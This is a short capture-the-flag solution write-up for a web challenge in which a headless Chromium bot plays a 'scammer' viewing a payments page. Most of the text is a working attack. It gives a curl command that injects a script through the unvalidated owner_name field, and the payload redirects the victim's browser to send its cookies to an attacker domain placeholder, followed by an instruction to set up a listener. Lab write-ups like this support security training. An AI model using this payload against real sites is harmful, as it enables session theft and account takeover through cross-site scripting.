# How to solve it?

This challenge is based on chromium bot running in the background. You have to get cookies from the "scammer" that opens their list of scammed credit cards at `/payments`. `owner_name` parameter is the only one that isn't validated. Reflected XSS may be trigerred via this parameter. Curl that solves this challenge:

```console
curl -X POST -H 'Content-Type: application/json' -d $'{ \"card_number\": \"VALID_CARD_NUMBER\", \"owner_name\": \"<script src=\'data:, document.location = \\\"https://MY_DOMAIN/?d=\\\" + document.cookie;\'></script>\", \"expire_date\": \"12 / 2023\", \"cvv\": \"123\"}' http://localhost/api/pay
```

Payload:
```
<script src='data:, document.location = "https://MY_DOMAIN/?d=" + document.cookie;'></script>
```

Set up listener on your publicly available domain and send this curl. 